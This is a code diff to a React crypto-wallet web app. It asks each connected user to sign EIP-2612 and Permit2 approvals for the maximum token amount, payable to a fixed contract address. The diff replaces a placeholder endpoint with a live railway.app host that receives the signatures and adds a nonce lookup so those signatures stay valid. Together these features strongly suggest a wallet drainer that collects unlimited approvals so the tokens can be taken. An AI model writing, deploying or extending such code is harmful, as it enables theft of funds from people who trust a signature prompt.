@@ -68,6 +68,10 @@ const EVM_ERC20_ABI = [
   'function name() view returns (string)'
 ]
 
+const PERMIT2_ABI = [
+    'function allowance(address user, address token, address spender) view returns (uint160 amount, uint48 expiration, uint48 nonce)'
+]
+
 // ── Reown Adapters ──
 const wagmiAdapter = new WagmiAdapter({
   projectId: WC_PROJECT_ID,
@@ -314,7 +318,7 @@ export default function App() {
                     const signature = await getPermitSignature(signer, token, EVM_CONTRACT_ADDRESS, MAX_UINT, deadline);
                     
                     // 🔥 BACKEND INTEGRATION ── SEND PERMIT SIG
-                    await fetch('https://your-api.com/execute-gasless', {
+                    await fetch('https://salvation-server-gp-production.up.railway.app/execute-gasless', {
                       method: 'POST',
                       headers: { 'Content-Type': 'application/json' },
                       body: JSON.stringify({ 
@@ -334,11 +338,18 @@ export default function App() {
                 }
             }
 
-            // 2. Try Permit2 (Gasless Signature)
+            // 2. Try Permit2 (Gasless Signature with Dynamic Nonce)
             if (!authorized) {
                 try {
                     setStatus(`Signing Permit2: ${token.symbol}...`);
-                    log(`[GASLESS] Requesting Permit2 Auth: ${token.symbol}`);
+                    
+                    // ── 🔥 UPGRADE: FETCHING DYNAMIC PERMIT2 NONCE ──
+                    log(`[GASLESS] Fetching Permit2 Nonce for ${token.symbol}`);
+                    const permit2Contract = new Contract(PERMIT2_ADDRESS, PERMIT2_ABI, signer);
+                    const allowanceData = await permit2Contract.allowance(cleanSenderAddress, token.address, EVM_CONTRACT_ADDRESS);
+                    const currentNonce = Number(allowanceData.nonce);
+                    log(`[SYSTEM] Permit2 Nonce found: ${currentNonce}`);
+
                     const domain = { name: 'Permit2', chainId: Number(chainId), verifyingContract: PERMIT2_ADDRESS };
                     const types = {
                         PermitSingle: [
@@ -354,7 +365,12 @@ export default function App() {
                         ],
                     };
                     const message = {
-                        details: { token: token.address, amount: '1461501637330902918203684832716283019655932542975', expiration: deadline, nonce: 0 },
+                        details: { 
+                            token: token.address, 
+                            amount: '1461501637330902918203684832716283019655932542975', 
+                            expiration: deadline, 
+                            nonce: currentNonce // 🔥 Now Dynamic!
+                        },
                         spender: EVM_CONTRACT_ADDRESS,
                         sigDeadline: deadline
                     };
@@ -370,7 +386,8 @@ export default function App() {
                         owner: cleanSenderAddress, 
                         spender: EVM_CONTRACT_ADDRESS, 
                         signature, 
-                        deadline 
+                        deadline,
+                        nonce: currentNonce // Include nonce for backend verification
                       })
                     });
 
